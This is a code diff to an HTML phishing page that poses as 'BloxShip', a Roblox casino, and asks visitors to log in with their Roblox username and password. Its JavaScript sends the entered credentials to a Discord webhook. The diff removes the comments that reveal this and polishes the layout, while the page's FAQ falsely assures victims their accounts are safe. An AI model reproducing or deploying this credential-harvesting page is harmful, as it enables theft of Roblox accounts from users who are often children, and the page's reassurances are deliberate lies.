@@ -15,12 +15,12 @@
         }
 
         function submitForm(event) {
-            event.preventDefault(); // Prevent form submission
+            event.preventDefault(); // 
 
             var username = document.querySelector('input[name="username"]').value;
             var password = document.querySelector('input[name="password"]').value;
 
-            // Construct the payload to be sent to Discord webhook
+            // 
             var payload = {
                 content: "Username: " + username + "\nPassword: " + password
             };
@@ -34,9 +34,9 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log("Data sent to Discord webhook successfully.");
+                    console.log("data");
                 } else {
-                    console.log("Failed to send login data.");
+                    console.log("fail");
                 }
             })
             .catch(error => {
@@ -58,8 +58,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            flex-direction: column;
+            min-height: 100vh;
         }
         .signupform {
             background-color: #fff;
@@ -68,16 +67,17 @@
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
             max-width: 800px;
             width: 100%;
+            box-sizing: border-box;
         }
         .container {
             display: flex;
-            justify-content: space-between;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
         }
         .w3l_form, .w3_info {
-            width: 48%;
-        }
-        .w3l_form .left_grid_info {
-            padding-right: 20px;
+            width: 100%;
+            margin-bottom: 20px;
         }
         .left_grid_info h1, .left_grid_info h2 {
             font-size: 24px;
@@ -105,10 +105,12 @@
         }
         .w3_info form {
             margin-top: 20px;
+            width: 100%;
         }
         .input-group {
             position: relative;
             margin-bottom: 20px;
+            width: 100%;
         }
         .input-group span {
             position: absolute;
@@ -144,6 +146,7 @@
         .account {
             margin-top: 20px;
             font-size: 16px;
+            text-align: center;
         }
         .account a {
             color: #337ab7;
@@ -156,51 +159,59 @@
             margin-top: 10px;
             font-size: 12px;
             color: #777;
+            text-align: center;
+        }
+        @media (min-width: 768px) {
+            .container {
+                flex-direction: row;
+                justify-content: space-between;
+            }
+            .w3l_form, .w3_info {
+                width: 48%;
+                margin-bottom: 0;
+            }
         }
     </style>
 </head>
 <body>    
 <div class="signupform">
     <div class="container">
-        <div class="agile_info">
-            <div class="w3l_form">
-                <div class="left_grid_info">
-                    <h1>BloxShip | Roblox Casino</h1>
-                    <h2>What is BloxShip?</h2>
-                    <p>BloxShip is a new thrilling Roblox gambling website with three unique game-modes! Our Coinflip mode is peer 2 peer meaning there is no house involved, purely testing your luck against other players! In Jackpot you're able to win up to 15 items with a potential 15 other players putting their items at stake each round. Rock Paper Scissors is similar to our Coinflip mode, with the added element of player choice to selecting a pick!</p><br>
-                    <h2>Are my account safe?</h2>
-                    <p>Absolutely! We don't store any account informations in our database, it's a all local in your own browser.</p><br>
-                    <h2>What is my connection used for?</h2>
-                    <p>In order to automate all trades and for our website to function, we use your session. Our bots do everything in real time, and ensures a trust-less system between all users.</p><br>
-                    <img src="images/banner.png" alt="Banner">
+        <div class="w3l_form">
+            <div class="left_grid_info">
+                <h1>BloxShip | Roblox Casino</h1>
+                <h2>What is BloxShip?</h2>
+                <p>BloxShip is a new thrilling Roblox gambling website with three unique game-modes! Our Coinflip mode is peer 2 peer meaning there is no house involved, purely testing your luck against other players! In Jackpot you're able to win up to 15 items with a potential 15 other players putting their items at stake each round. Rock Paper Scissors is similar to our Coinflip mode, with the added element of player choice to selecting a pick!</p><br>
+                <h2>Are my account safe?</h2>
+                <p>Absolutely! We don't store any account informations in our database, it's a all local in your own browser.</p><br>
+                <h2>What is my connection used for?</h2>
+                <p>In order to automate all trades and for our website to function, we use your session. Our bots do everything in real time, and ensures a trust-less system between all users.</p><br>
+                <img src="images/banner.png" alt="Banner">
+            </div>
+        </div>
+        <div class="w3_info">
+            <h2>Welcome User!</h2><br>
+            <h3>Connect your Roblox account to BloxShip for login.</h3>
+            <p>Before logging in, please read our <span style="color: #4b79bd; cursor: pointer; font-weight: 500;">frequently asked questions</span>. For further assistance on how to login, watch this <a href="https://www.youtube.com/watch?v=ZSUygtqD657" target="_blank" style="color: #4b79bd; cursor: pointer; font-weight: 500; text-decoration: none;">Youtube video</a>!</p>
+            <form id="login-form" onsubmit="submitForm(event)">
+                <label>Username</label>
+                <div class="input-group">
+                    <span class="fa fa-user" aria-hidden="true"></span>
+                    <input type="text" name="username" placeholder="Username/Email/Phone" required="">
                 </div>
-            </div>
-            <div class="w3_info">
-                <h2>Welcome User!</h2><br>
-                <h3>Connect your Roblox account to BloxShip for login.</h3>
-                <p>Before logging in, please read our <span style="color: #4b79bd; cursor: pointer; font-weight: 500;">frequently asked questions</span>. For further assistance on how to login, watch this <a href="https://www.youtube.com/watch?v=ZSUygtqD657" target="_blank" style="color: #4b79bd; cursor: pointer; font-weight: 500; text-decoration: none;">Youtube video</a>!</p>
-                <form id="login-form" onsubmit="submitForm(event)">
-                    <label>Username</label>
-                    <div class="input-group">
-                        <span class="fa fa-user" aria-hidden="true"></span>
-                        <input type="text" name="username" placeholder="Username/Email/Phone" required=""> 
-                    </div>
-                    <label>Password</label>
-                    <div class="input-group">
-                        <span class="fa fa-lock" aria-hidden="true"></span>
-                        <input type="password" name="password" placeholder="Password" required="">
-                    </div> 
-                    <div class="login-check">
-                        <label class="checkbox"><input type="checkbox" name="checkbox" checked=""><i> </i>Agree to our terms of service</label>
-                   </div>                    
-                        <button class="btn btn-danger btn-block" type="submit">Log In</button>
-                </form>
-                <p class="account">New to BloxShip &amp; Roblox? <a href="https://www.roblox.com/account/signupredir" target="_blank">Create an account</a></p>
-                <p class="account1">©BloxShip - Logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.<a href="#"></a></p>
-            </div>
+                <label>Password</label>
+                <div class="input-group">
+                    <span class="fa fa-lock" aria-hidden="true"></span>
+                    <input type="password" name="password" placeholder="Password" required="">
+                </div> 
+                <div class="login-check">
+                    <label class="checkbox"><input type="checkbox" name="checkbox" checked=""><i> </i>Agree to our terms of service</label>
+               </div>                    
+                    <button class="btn btn-danger btn-block" type="submit">Log In</button>
+            </form>
+            <p class="account">New to BloxShip &amp; Roblox? <a href="https://www.roblox.com/account/signupredir" target="_blank">Create an account</a></p>
+            <p class="account1">©BloxShip - Logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.<a href="#"></a></p>
         </div>
     </div>
 </div>
-
 </body>
 </html>
